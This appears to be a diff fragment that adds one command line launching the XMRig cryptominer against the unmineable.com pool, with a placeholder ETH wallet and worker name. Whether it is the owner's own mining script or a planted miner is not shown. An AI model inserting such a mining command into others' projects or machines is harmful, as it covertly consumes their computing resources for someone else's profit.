@@ -1,0 +1,1 @@
+xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u ETH:walleteth.workname+50000#erfp-7ka7
